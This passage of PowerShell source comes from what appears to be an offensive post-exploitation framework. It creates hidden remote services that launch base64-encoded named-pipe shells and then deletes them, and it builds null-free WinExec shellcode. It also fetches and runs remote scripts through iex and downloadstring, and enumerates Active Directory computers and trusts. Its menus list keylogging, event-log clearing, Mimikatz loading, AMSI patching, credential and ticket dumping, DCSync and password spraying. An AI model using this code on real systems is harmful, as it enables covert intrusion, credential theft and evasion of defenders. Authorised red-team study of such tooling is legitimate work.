`$pipeClient.Dispose()
"@
	$b64ClientScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ClientScript))
	
	$arguments = "\\$Target create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $b64ClientScript`""
	
	$startarguments = "\\$Target start $ServiceName"
	
	Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
	
	Start-Sleep -Milliseconds 1000
	
	Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
	
	# Get the current process ID
	$currentPID = $PID
	
	# Embedded monitoring script
	$monitoringScript = @"
`$serviceToDelete = "$ServiceName" # Name of the service you want to delete
`$TargetServer = "$Target"
`$primaryScriptProcessId = $currentPID

while (`$true) {
	Start-Sleep -Seconds 5 # Check every 5 seconds

	# Check if the primary script is still running using its Process ID
	`$process = Get-Process | Where-Object { `$_.Id -eq `$primaryScriptProcessId }

	if (-not `$process) {
		# If the process is not running, delete the service
		`$stoparguments = "\\`$TargetServer delete `$serviceToDelete"
		Start-Process sc.exe -ArgumentList `$stoparguments -WindowStyle Hidden
		break # Exit the monitoring script
	}
}
"@
	
	$b64monitoringScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($monitoringScript))
	
	# Execute the embedded monitoring script in a hidden window
	Start-Process powershell.exe -ArgumentList "-WindowS Hidden -ep Bypass -enc $b64monitoringScript" -WindowStyle Hidden
	
	# Create security descriptor to allow everyone full control over the pipe
	$securityDescriptor = New-Object System.IO.Pipes.PipeSecurity
	$everyone = New-Object System.Security.Principal.SecurityIdentifier "S-1-1-0"
	$accessRule = New-Object System.IO.Pipes.PipeAccessRule($everyone, "FullControl", "Allow")
	$securityDescriptor.AddAccessRule($accessRule)
	
	$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, 'InOut', 1, 'Byte', 'None', 1028, 1028, $securityDescriptor)
	
	$psScript = "Start-Sleep -Seconds 30; `$dummyPipeClient = New-Object System.IO.Pipes.NamedPipeClientStream(`".`", `"$pipeName`", 'InOut'); `$dummyPipeClient.Connect(); `$sw = New-Object System.IO.StreamWriter(`$dummyPipeClient); `$sw.WriteLine(`"dummyhostdropconnection,`$(Get-Location)`"); `$sw.Flush(); `$dummyPipeClient.Close()"
	
	$b64psScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($psScript))
	
	Start-Process -FilePath "powershell.exe" -ArgumentList "-ep bypass -WindowS Hidden -enc $b64psScript" -WindowStyle Hidden

	$pipeServer.WaitForConnection()
	
	$sr = New-Object System.IO.StreamReader($pipeServer)
	$sw = New-Object System.IO.StreamWriter($pipeServer)

	# Get the hostname and $pwd from the client
	$initialInfo = $sr.ReadLine().Split(',')
	$computerNameOnly = $initialInfo[0]
	$remotePath = $initialInfo[1]
	
	if ($computerNameOnly -eq 'dummyhostdropconnection') {
		$global:Message = " [-] No connection was established"
		#Write-Output "[-] No connection was established. Returning to previous menu..."
		
		# Close resources related to this pipe and return to the previous menu.
		
		# Ensure StreamWriter is not closed and then close it
		if ($sw) {
			$sw.Close()
		}

		# Ensure StreamReader is not closed and then close it
		if ($sr) {
			$sr.Close()
		}

		# Close the pipe
		if ($pipeServer -and $pipeServer.IsConnected) {
			$pipeServer.Close()
		}
		return
	}
	
	InteractWithPipeSession -PipeServer $pipeServer -StreamWriter $sw -StreamReader $sr -computerNameOnly $computerNameOnly -PipeName $PipeName -TargetServer $Target -serviceToDelete $ServiceName -Admin
}

function Detached-Interaction {

	param (
		[string]$PipeName,
		[string]$Target,
		[string]$ServiceName,
		[string]$Command,
		[string]$Timeout
	)
	
	if (-not $Target) {
		Write-Output " [-] Please specify a target"
		return
	}
	
	if(!$PipeName){
		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
		$randomvalue = $randomvalue -join ""
		$PipeName = $randomvalue
	}
	
	if(!$ServiceName){
		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
		$randomvalue = $randomvalue -join ""
		$ServiceName = "Service_" + $randomvalue
	}
	
	$PN = $PipeName
	
	$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"
	
	$b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
	
	$arguments = "\\$Target create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $b64ServerScript`""
	
	$startarguments = "\\$Target start $ServiceName"
	
	Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
	
	Start-Sleep -Milliseconds 1000
	
	Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
	
	# Get the current process ID
	$currentPID = $PID
	
	# Embedded monitoring script
	$monitoringScript = @"
`$serviceToDelete = "$ServiceName" # Name of the service you want to delete
`$TargetServer = "$Target"
`$primaryScriptProcessId = $currentPID

while (`$true) {
	Start-Sleep -Seconds 5 # Check every 5 seconds

	# Check if the primary script is still running using its Process ID
	`$process = Get-Process | Where-Object { `$_.Id -eq `$primaryScriptProcessId }

	if (-not `$process) {
		# If the process is not running, delete the service
		`$stoparguments = "\\`$TargetServer delete `$serviceToDelete"
		Start-Process sc.exe -ArgumentList `$stoparguments -WindowStyle Hidden
		break # Exit the monitoring script
	}
}
"@
	
	$b64monitoringScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($monitoringScript))
	
	# Execute the embedded monitoring script in a hidden window
	Start-Process powershell.exe -ArgumentList "-WindowS Hidden -ep Bypass -enc $b64monitoringScript" -WindowStyle Hidden
	
	$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream("$Target", $PipeName, 'InOut')
	
	try {
		$pipeClient.Connect($Timeout)
	} catch [System.TimeoutException] {
		Write-Output "[$($Target)]: Connection timed out"
		Write-Output ""
		return
	} catch {
		Write-Output "[$($Target)]: An unexpected error occurred"
		Write-Output ""
		return
	}
	
	$sr = New-Object System.IO.StreamReader($pipeClient)
	$sw = New-Object System.IO.StreamWriter($pipeClient)
	
	InteractWithPipeSession -PipeClient $pipeClient -StreamWriter $sw -StreamReader $sr -computerNameOnly $Target -PipeName $PipeName -TargetServer $Target -serviceToDelete $ServiceName -Admin
}

function Reverse ([array] $chunks) {
    $arr = $chunks | ForEach-Object { $_ }
    [array]::Reverse($arr)
    return $arr
}
 
function Encode-Command {
    param (
        [string]$command
    )
    while ($command.Length -lt 7) {
        $command = $command + " "
    }
 
    $result = [System.Text.Encoding]::UTF8.GetBytes($command)
    $result = $result | ForEach-Object { -bnot ($_ -band 0xFF) -band 0xFF }
    if ($command.Length -lt 8) {
        $result += 0xff
    }
    return $result
 
}
 
function Command ([string] $command) {
    $size = 8
    $chunks = @(for ($i = 0; $i -lt $command.Length; $i += $size) { $command.Substring($i, [Math]::Min($size, $command.Length - $i)) })
    $output = @()
    if ($chunks.Count -gt 1) {
        $chunks = Reverse($chunks)
    } else {
        $output += 0x48,0xb9,0xdf,0xdf,0xdf,0xdf,0xdf,0xdf,0xdf,0xff,0x48,0xf7,0xd1,0x51
    }
    foreach ($chunk in $chunks) {
        $output += 0x48,0xb9
    $output += Encode-Command $chunk
        $output += 0x48,0xf7,0xd1
        $output += 0x51
    }
    return $output
}
 
function ShellGen {
	param ([string]$ShCommand)
# WinExec x64 PI Null Free 
 
[Byte[]] $shellcode = 0x48,0x31,0xd2        # xor rdx,rdx
$shellcode += 0x65,0x48,0x8b,0x42,0x60      # mov rax,qword ptr gs:[rdx+0x60]
$shellcode += 0x48,0x8b,0x70,0x18       # mov rsi,qword ptr [rax+0x18]
$shellcode += 0x48,0x8b,0x76,0x20       # mov rsi,qword ptr [rax+0x20]
$shellcode += 0x4c,0x8b,0x0e            # mov r9,QWORD PTR [rsi]
$shellcode += 0x4d,0x8b,0x09            # mov r9,QWORD PTR [r9]
$shellcode += 0x4d,0x8b,0x49,0x20       # mov r9,QWORD PTR [r9+0x20]
$shellcode += 0xeb,0x63             # jmp 0x7f
$shellcode += 0x41,0x8b,0x49,0x3c       # mov ecx,DWORD PTR [r9+0x3c]
$shellcode += 0x4d,0x31,0xff            # xor r15,r15
$shellcode += 0x41,0xb7,0x88            # mov r15b,0x88
$shellcode += 0x4d,0x01,0xcf            # add r15,r9
$shellcode += 0x49,0x01,0xcf            # add r15,rcx
$shellcode += 0x45,0x8b,0x3f            # mov r15d,dword ptr [r15]
$shellcode += 0x4d,0x01,0xcf            # add r15,r9
$shellcode += 0x41,0x8b,0x4f,0x18       # mov ecx,dword ptr [r15+0x18]
$shellcode += 0x45,0x8b,0x77,0x20       # mov r14d,dword ptr [r15+0x20]
$shellcode += 0x4d,0x01,0xce            # add r14,r9
$shellcode += 0xe3,0x3f             # jrcxz 0x7e
$shellcode += 0xff,0xc9             # dec ecx
$shellcode += 0x48,0x31,0xf6            # xor rsi,rsi
$shellcode += 0x41,0x8b,0x34,0x8e       # mov esi,DWORD PTR [r14+rcx*4]
$shellcode += 0x4c,0x01,0xce            # add rsi,r9
$shellcode += 0x48,0x31,0xc0            # xor rax,rax
$shellcode += 0x48,0x31,0xd2            # xor rdx,rdx
$shellcode += 0xfc              # cld
$shellcode += 0xac              # lods al,byte ptr ds:[rsi]
$shellcode += 0x84,0xc0             # test al,al
$shellcode += 0x74,0x07             # je 0x5e
$shellcode += 0xc1,0xca,0x0d            # ror edx,0xd
$shellcode += 0x01,0xc2             # add edx,eax
$shellcode += 0xeb,0xf4             # jmp 0x52
$shellcode += 0x44,0x39,0xc2            # cmp edx,r8d
$shellcode += 0x75,0xda             # jne 0x3d
$shellcode += 0x45,0x8b,0x57,0x24       # mov r10d,DWORD PTR [r15+0x24]
$shellcode += 0x4d,0x01,0xca            # add r10,r9
$shellcode += 0x41,0x0f,0xb7,0x0c,0x4a      # movzx ecx,WORD PTR [r10+rcx*2]
$shellcode += 0x45,0x8b,0x5f,0x1c       # mov r11d,DWORD PTR [r15+0x1c]
$shellcode += 0x4d,0x01,0xcb            # add r11,r9
$shellcode += 0x41,0x8b,0x04,0x8b       # mov eax,DWORD PTR [r11+rcx*4]
$shellcode += 0x4c,0x01,0xc8            # add rax,r9
$shellcode += 0xc3              # ret
$shellcode += 0xc3              # ret
$shellcode += 0x41,0xb8,0x83,0xb9,0xb5,0x78     # mov r8d, 0x78b5b983 TerminateProcess Hash
$shellcode += 0xe8,0x92,0xff,0xff,0xff      # call 0x1c
$shellcode += 0x48,0x89,0xc3            # mov rbx, rax
$shellcode += 0x41,0xb8,0x98,0xfe,0x8a,0x0e # mov r8d,0xe8afe98 WinExec Hash
$shellcode += 0xe8,0x84,0xff,0xff,0xff      # call 0x1c
$shellcode += 0x48,0x31,0xc9            # xor rcx,rcx
 
$shellcode += Command $ShCommand
 
$shellcode += 0x48,0x8d,0x0c,0x24       # lea rcx,[rsp]
$shellcode += 0x48,0x31,0xd2            # xor rdx,rdx
$shellcode += 0x48,0xff,0xc2            # inc rdx
$shellcode += 0x48,0x83,0xec,0x28       # sub rsp, 0x28
$shellcode += 0xff,0xd0             # call rax
 
$shellcode += 0x48,0x31,0xc9            # xor rcx,rcx
$shellcode += 0x48,0xff,0xc1            # inc rcx
$shellcode += 0x48,0x31,0xc0            # xor rax,rax
$shellcode += 0x04,0x53             # add al, 0x53 exit_thread syscall val
$shellcode += 0x0f,0x05             # syscall
 
 
# Writes Out Hex for Shellcode Bytes
$test = "$($shellcode | foreach-object { "$($_.ToString("X2"))" })"
$test = $test.replace(' ','')
Write-Output $test
}

$FileServerScript = @'
Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

public class SimpleFileServer
{
    public TcpListener Listener { get; private set; }

    public SimpleFileServer(IPAddress address, int port)
    {
        Listener = new TcpListener(address, port);
    }

    public void Start(string rootDirectory)
    {
        Listener.Start();
        Console.WriteLine("Listening on " + Listener.LocalEndpoint);

        while (true)
        {
            using (var client = Listener.AcceptTcpClient())
            using (var stream = client.GetStream())
            using (var reader = new StreamReader(stream))
            using (var writer = new StreamWriter(stream))
            {
                var request = reader.ReadLine();
                Console.WriteLine(request);
                var tokens = request.Split(' ');
                if (tokens[0] == "GET")
                {
                    var url = tokens[1];
                    if (url == "/") url = "/index.html";
                    var path = Path.Combine(rootDirectory, url.Replace("/", "\\").TrimStart('\\'));

                    if (File.Exists(path))
                    {
                        var content = File.ReadAllBytes(path);
                        writer.WriteLine("HTTP/1.1 200 OK");
                        writer.WriteLine("Content-Length: " + content.Length);
                        writer.WriteLine("Connection: close");
                        writer.WriteLine("");
                        writer.Flush();
                        stream.Write(content, 0, content.Length);
                    }
                    else
                    {
                        writer.WriteLine("HTTP/1.1 404 Not Found");
                        writer.WriteLine("Connection: close");
                        writer.WriteLine("");
                    }
                }
                writer.Flush();
            }
        }
    }
}
"@ -Language CSharp

function File-Server {
	
	param($Port, $Path)
	
	if(!$Port){$Port = 8080}
	if(!$Path){$Path = "c:\Users\Public\Documents\Amnesiac\Scripts"}

	# Now create an instance of this server in PowerShell and start it
	$server = New-Object SimpleFileServer ([IPAddress]::Any, $Port)
	$rootDirectory = $Path  # Set your files' directory here
	
	$server.Start($rootDirectory)
}
'@

function Get-ADComputers {
    param (
        [string]$ADCompDomain
    )

    $allcomputers = @()
    $objSearcher = New-Object System.DirectoryServices.DirectorySearcher

    # Construct distinguished name for the domain.
    if ($ADCompDomain) {
        $domainDN = "DC=" + ($ADCompDomain -replace "\.", ",DC=")
        $ldapPath = "LDAP://$domainDN"
        $objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
    } else {
        $objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry
    }

    # LDAP search request setup.
    $objSearcher.Filter = "(&(sAMAccountType=805306369)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
    $objSearcher.PageSize = 1000  # Handling paging internally
    $objSearcher.PropertiesToLoad.Clear() | Out-Null
    $objSearcher.PropertiesToLoad.Add("dNSHostName") | Out-Null

    # Perform the search
    $results = $objSearcher.FindAll()

    # Process the results
    foreach ($result in $results) {
        $allcomputers += $result.Properties["dNSHostName"]
    }

    return $allcomputers | Sort-Object -Unique
}

function FindDomainTrusts {
    param (
        [Parameter(Mandatory = $true)]
        [string]$Domain,
        [Parameter(Mandatory = $false)]
        [string]$Server
    )

    # Define the TrustAttributes mapping
    $TrustAttributesMapping = @{
        [uint32]'0x00000001' = 'NON_TRANSITIVE'
        [uint32]'0x00000002' = 'UPLEVEL_ONLY'
        [uint32]'0x00000004' = 'FILTER_SIDS'
        [uint32]'0x00000008' = 'FOREST_TRANSITIVE'
        [uint32]'0x00000010' = 'CROSS_ORGANIZATION'
        [uint32]'0x00000020' = 'WITHIN_FOREST'
        [uint32]'0x00000040' = 'TREAT_AS_EXTERNAL'
        [uint32]'0x00000080' = 'TRUST_USES_RC4_ENCRYPTION'
        [uint32]'0x00000100' = 'TRUST_USES_AES_KEYS'
        [uint32]'0x00000200' = 'CROSS_ORGANIZATION_NO_TGT_DELEGATION'
        [uint32]'0x00000400' = 'PIM_TRUST'
    }

    try {
        # Construct the LDAP path and create the DirectorySearcher
        $ldapPath = if ($Server) { "LDAP://$Server/DC=$($Domain -replace '\.',',DC=')" } else { "LDAP://DC=$($Domain -replace '\.',',DC=')" }
        $searcher = New-Object System.DirectoryServices.DirectorySearcher
        $searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
        $searcher.Filter = "(objectClass=trustedDomain)"
        $searcher.PropertiesToLoad.AddRange(@("name", "trustPartner", "trustDirection", "trustType", "trustAttributes", "whenCreated", "whenChanged"))
        
        # Execute the search
        $results = $searcher.FindAll()

        # Enumerate the results
        foreach ($result in $results) {
            # Resolve the trust direction
            $Direction = Switch ($result.Properties["trustdirection"][0]) {
                0 { 'Disabled' }
                1 { 'Inbound' }
                2 { 'Outbound' }
                3 { 'Bidirectional' }
            }

            # Resolve the trust type
            $TrustType = Switch ($result.Properties["trusttype"][0]) {
                1 { 'WINDOWS_NON_ACTIVE_DIRECTORY' }
                2 { 'WINDOWS_ACTIVE_DIRECTORY' }
                3 { 'MIT' }
            }

            # Resolve the trust attributes
            $TrustAttributes = @()
            foreach ($key in $TrustAttributesMapping.Keys) {
                if ($result.Properties["trustattributes"][0] -band $key) {
                    $TrustAttributes += $TrustAttributesMapping[$key]
                }
            }

            # Create and output the custom object
            $trustInfo = New-Object PSObject -Property @{
                SourceName      = $Domain
                TargetName      = $result.Properties["trustPartner"][0]
                TrustDirection  = $Direction
                TrustType       = $TrustType
                TrustAttributes = ($TrustAttributes -join ', ')
                WhenCreated     = $result.Properties["whenCreated"][0]
                WhenChanged     = $result.Properties["whenChanged"][0]
            }

            $trustInfo
        }
    }
    catch {
        Write-Error "An error occurred: $_"
    }
    finally {
        $searcher.Dispose()
        if ($results) { $results.Dispose() }
    }
}

function PrintHelpSessionHunter{
	
	Write-Output ""
	Write-Output "[+] Invoke-SessionHunter Loaded | https://github.com/Leo4j/Invoke-SessionHunter"
	Write-Output ""
	Write-Output "[+] Usage:"
	Write-Output ""
	Write-Output "    Invoke-SessionHunter"
	Write-Output "    Invoke-SessionHunter -CheckAsAdmin"
	Write-Output "    Invoke-SessionHunter -CheckAsAdmin -FailSafe"
	Write-Output "    Invoke-SessionHunter -CheckAsAdmin -UserName 'ferrari\Administrator' -Password 'P@ssw0rd!'"
	Write-Output "    Invoke-SessionHunter -Domain ferrari.local -DomainController DC01.ferrari.local"
}

function PrintHelpLocalAdminAccess{
	Write-Output ""
	Write-Output "[+] Find-LocalAdminAccess Loaded | https://github.com/Leo4j/Find-LocalAdminAccess"
	Write-Output ""
	Write-Output "[+] Usage:"
	Write-Output ""
	Write-Output "    Find-LocalAdminAccess -Method SMB"
	Write-Output "    Find-LocalAdminAccess -Method SMB -InLine"
	Write-Output "    Find-LocalAdminAccess -Method SMB -Domain ferrari.local -DomainController DC01.ferrari.local"
	Write-Output "    Find-LocalAdminAccess -Method SMB -Command 'whoami'"
	Write-Output "    Find-LocalAdminAccess -Method SMB -Command 'whoami' -NoOutput"
	Write-Output "    Find-LocalAdminAccess -Method SMB -Targets `"Workstation-01.ferrari.local,DC01.ferrari.local`""
	Write-Output ""
	Write-Output "    Find-LocalAdminAccess -Method WMI"
	Write-Output "    Find-LocalAdminAccess -Method WMI -InLine"
	Write-Output "    Find-LocalAdminAccess -Method WMI -Domain ferrari.local -DomainController DC01.ferrari.local"
	Write-Output "    Find-LocalAdminAccess -Method WMI -Command 'whoami'"
	Write-Output "    Find-LocalAdminAccess -Method WMI -Command 'whoami' -NoOutput"
	Write-Output "    Find-LocalAdminAccess -Method WMI -UserName `"ferrari\Administrator`" -Password `"P@ssw0rd!`""
	Write-Output "    Find-LocalAdminAccess -Method WMI -UserName `".\Administrator`" -Password `"P@ssw0rd!`""
	Write-Output "    Find-LocalAdminAccess -Method WMI -Targets `"Workstation-01.ferrari.local,DC01.ferrari.local`""
	Write-Output ""
	Write-Output "    Find-LocalAdminAccess -Method PSRemoting"
	Write-Output "    Find-LocalAdminAccess -Method PSRemoting -InLine"
	Write-Output "    Find-LocalAdminAccess -Method PSRemoting -Domain ferrari.local -DomainController DC01.ferrari.local"
	Write-Output "    Find-LocalAdminAccess -Method PSRemoting -Command 'whoami'"
	Write-Output "    Find-LocalAdminAccess -Method PSRemoting -Command 'whoami' -NoOutput"
	Write-Output "    Find-LocalAdminAccess -Method PSRemoting -UserName `"ferrari\Administrator`" -Password `"P@ssw0rd!`""
	Write-Output "    Find-LocalAdminAccess -Method PSRemoting -UserName `".\Administrator`" -Password `"P@ssw0rd!`""
	Write-Output "    Find-LocalAdminAccess -Method PSRemoting -Targets `"Workstation-01.ferrari.local,DC01.ferrari.local`""
	Write-Output ""
	Write-Output ""
	Write-Output "[+] Get a Shell:"
	Write-Output ""
	Write-Output "    shell_smbadmin                                 Get a shell on targets where the current user is local admin (SMB)"
	Write-Output "    shell_smbadmin -Targets `"`"                     Specify your targets - comma separated hostnames"
	Write-Output "    shell_smbadmin -Domain _ -DomainController _   Specify a target Domain and Domain Controller"
	Write-Output ""
	Write-Output "    shell_wmiadmin                                 Get a shell on targets where the current user is local admin (WMI)"
	Write-Output "    shell_wmiadmin -Targets `"`"                     Specify your targets - comma separated hostnames"
	Write-Output "    shell_wmiadmin -Username `"`" -Password `"`"       Specify Credentials and gain a shell as that user"
	Write-Output "    shell_wmiadmin -Domain _ -DomainController _   Specify a target Domain and Domain Controller"
	Write-Output ""
	Write-Output "    shell_psadmin                                  Get a shell on targets where the current user is local admin (PSRemoting)"
	Write-Output "    shell_psadmin -Targets `"`"                      Specify your targets - comma separated hostnames"
	Write-Output "    shell_psadmin -Username `"`" -Password `"`"        Specify Credentials and gain a shell as that user"
	Write-Output "    shell_psadmin -Domain _ -DomainController _    Specify a target Domain and Domain Controller"
}

function PrintHelpRemoting{
	Write-Output ""
	Write-Output "[+] SMBRemoting and WMIRemoting Loaded | https://github.com/Leo4j/Invoke-SMBRemoting | https://github.com/Leo4j/Invoke-WMIRemoting"
	Write-Output ""
	Write-Output "[+] Usage:"
	Write-Output ""
	Write-Output "    Invoke-SMBRemoting -ComputerName Server01.ferrari.local -Command 'whoami /all'"
	Write-Output ""
	Write-Output "    Invoke-WMIRemoting -ComputerName Server01.ferrari.local -Command 'whoami /all'"
	Write-Output "    Invoke-WMIRemoting -ComputerName Server01.ferrari.local -Command 'whoami /all' -Username '.\Administrator' -Password 'P@ssw0rd!'"
	Write-Output "    Invoke-WMIRemoting -ComputerName Server01.ferrari.local -Command 'whoami /all' -Username 'ferrari\Administrator' -Password 'P@ssw0rd!'"
	Write-Output ""
	Write-Output "    Invoke-Command -ComputerName Server01.ferrari.local -ScriptBlock {whoami}"
	Write-Output ""
	Write-Output "[+] Shortcuts:"
	Write-Output ""
	Write-Output "    SMBRemoting <fqdn> <cmd>      Run command on target as current user using SMBRemoting"
	Write-Output "    WMIRemoting <fqdn> <cmd>      Run command on target as current user using WMIRemoting"
	Write-Output ""
	Write-Output ""
	Write-Output "[*] Important:"
	Write-Output ""
	Write-Output "    Do not run as local user (e.g.: nt authority\system) unless you specify credentials (WMI only)"
	Write-Output "    Do not set $computerNameOnly as target if using WMI."
}

function PrintHelpImpersonation{
	Write-Output ""
	Write-Output "[+] Token-Impersonation Loaded | https://github.com/Leo4j/Token-Impersonation"
	Write-Output ""
	Write-Output "[+] Usage:"
	Write-Output ""
	Write-Output "    Token-Impersonation -MakeToken -Username `"Administrator`" -Domain `"ferrari.local`" -Password `"P@ssw0rd!`""
	Write-Output ""
	Write-Output "    Token-Impersonation -Steal -ProcessID 5380"
	Write-Output ""
	Write-Output "    Token-Impersonation -Rev2Self"
	Write-Output ""
	Write-Output "[+] Check Access:"
	Write-Output ""
	Write-Output "    Access_Check -Method SMB"
	Write-Output ""
	Write-Output "    Access_Check -Method SMB -Domain ferrari.local -DomainController DC01.ferrari.local"
	Write-Output ""
	Write-Output "    Access_Check -Method SMB -Targets `"DC01.ferrari.local,Server2012.ferrari.local`""
	Write-Output ""
	Write-Output "    Access_Check -Method PSRemoting"
	Write-Output ""
	Write-Output "    Access_Check -Method PSRemoting -Domain ferrari.local -DomainController DC01.ferrari.local"
	Write-Output ""
	Write-Output "    Access_Check -Method PSRemoting -Command `"whoami /all`""
	Write-Output ""
	Write-Output "    Access_Check -Method PSRemoting -Targets `"DC01.ferrari.local,Server2012.ferrari.local`" -Command `"whoami /all`""
	Write-Output ""
	Write-Output "[+] Get a Shell:"
	Write-Output ""
	Write-Output "    shell_tknadmin                                  Get a shell on targets where the current user is local admin (PSRemoting)"
	Write-Output ""
	Write-Output "    shell_tknadmin -Domain _ -DomainController _    Specify a target Domain and Domain Controller"
	Write-Output ""
	Write-Output "    shell_tknadmin -Targets `"`"                      Specify your targets - comma separated hostnames"
}

function Get-AvailableCommands  {
	
	Write-Output ""
	Write-Output " [+] Core Commands:"
	Write-Output ""
	Write-Output " Download           Download file from remote system [file name]"
	Write-Output " Exit               Background the current session"
	Write-Output " GListener          Print Global-Listener Payload"
	Write-Output " GLSet <>           Set Global-Listener Pipe Name"
	Write-Output " Help               Help menu"
	Write-Output " Kill               Terminate the current session"
	Write-Output " OneIsNone          Get a Backup Shell"
	Write-Output " Scramble           Rotate Global-Listener Pipe Name"
	Write-Output " Sync               Re-Sync Stream"
	Write-Output " Toggle             Switch payload format [default: cmd(b64)]"
	Write-Output " Upload             Upload file to remote system [full path]"
    Write-Output ""
	Write-Output ""
	Write-Output " [+] System Commands:"
	Write-Output ""
	Write-Output " AV                 Check local AV"
	Write-Output " Net                Netstat Command"
	Write-Output " Process            Display Running Processes"
	Write-Output " Services           Display Running Services"
	Write-Output " Sessions           Show active Sessions"
	Write-Output " Software           Display Installed Software"
	Write-Output " Startup            Display Startup Apps"
	Write-Output ""
	Write-Output ""
	Write-Output " [+] User Activity:"
	Write-Output ""
	Write-Output " ClearHistory       Clear History for Current User"
	Write-Output " ClearLogs          Clear Logs from Event Viewer"
	Write-Output " Clipboard          Get the clipboard (text)"
	Write-Output " History            Get pwsh history for all users"
	Write-Output " Keylog             Start Keylogger"
	Write-Output " KeylogRead         Read Keylog output"
 	Write-Output " RDPKeylog          Start RDP Keylogger"
	Write-Output " RDPKeylogRead      Read RDP Keylog output"
	Write-Output " ScreenShot         Take a screenshot [1080p]"
	Write-Output " Screen4K           Take a screenshot [4K]"
	Write-Output ""
	Write-Output ""
	Write-Output " [+] Scripts Loading:"
	Write-Output ""
	Write-Output " Mimi               Load Katz"
	Write-Output " Patch              Patch 4MZI"
	Write-Output " PatchNet           Patch 4MZI .NET"
	Write-Output " PInject            Load ProcessInjection"
	Write-Output " PowerView          Load PowerView"
	Write-Output " Rubeus             Load Rubeus"
	Write-Output " TLS                Enable TLS 1.2"
	Write-Output ""
	Write-Output ""
	Write-Output " [+] Local Actions:"
	Write-Output ""
	Write-Output " Ask4Creds          Prompt User for Credentials"
	Write-Output " AutoMimi           Load Katz and dump"
	Write-Output " CredMan            CredManager Dump"
	Write-Output " Dpapi              Retrieve credentials protected by DPAPI"
	Write-Output " GetSystem          Get a System Shell [New Session]"
	Write-Output " HashGrab           Attempt to retrieve the Hash of the current user"
	Write-Output " Hive               HiveDump"
	Write-Output " Kerb               Kerb TGTs Dump"
	Write-Output " Migrate <pid>      Inject payload into specified pid [New Session]"
 	Write-Output " Migrate2 <pid>     Different migration syntax [In case the above fails]"
	Write-Output " Monitor            Monitor Cache for TGTs"
	Write-Output " MonitorRead        Retrieve TGTs from Monitor activity"
	Write-Output " MonitorClear       Clear TGTs from Monitor activity"
	Write-Output ""
	Write-Output ""
	Write-Output " [+] Domain Actions:"
	Write-Output ""
	Write-Output " CredValidate       Validate Domain Credentials"
	Write-Output " DCSync             Performs DCSync"
	Write-Output " Impersonation      Token Impersonation | Make or Steal a Token"
	Write-Output " LocalAdminAccess   Check Targets for Local Admin Access"
	Write-Output " PassSpray          Domain Password Spray"
	Write-Output " Remoting           Remote Command Execution SMB|WMI|WinRM"
	Write-Output " SessionHunter      Hunt for Active User Sessions"
	Write-Output ""
	Write-Output ""
}

function Get-Command {
	param (
		[string]$Command
	)
	
	if($Command -eq "AV"){
		$predefinedCommands = @(
			'WMIC /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct;Get-Service | Where-Object { $_.DisplayName -like "*antivirus*" };Get-Process | Where-Object { $_.Name -like "*antivirus*" };Get-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"'
		)
	}
	
	elseif($Command -eq "TLS"){
		$predefinedCommands = @(
			'[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;Write-Output "[+] TLS Enabled"'
		)
	}
	
	elseif($Command -eq "PInject"){
		$predefinedCommands = @(
			"iex(new-object net.webclient).downloadstring('$($global:ServerURL)/PInject.ps1');Write-Output '';Write-Output '[+] PInject Loaded | https://github.com/3xpl01tc0d3r/ProcessInjection';Write-Output '';Write-Output '[+] Usage: PInject <pid> <shellcode_in_hex_format>';Write-Output '';Write-Output '[+] Tip: How to generate your hex shell code:';Write-Output '';Write-Output '    ShellGen powershell.exe -ep bypass -WindowS Hidden -enc JABzAGQA.....wBlACgAKQA=';Write-Output '';Write-Output '    msfvenom -p windows/x64/exec CMD=`"powershell.exe -ep bypass -WindowS Hidden -enc JABzAGQA.....wBlACgAKQA=`" exitfunc=thread -b `"\x00`" -f hex'"
		)
	}
	
	elseif($Command -eq "HashGrab"){
		$predefinedCommands = @(
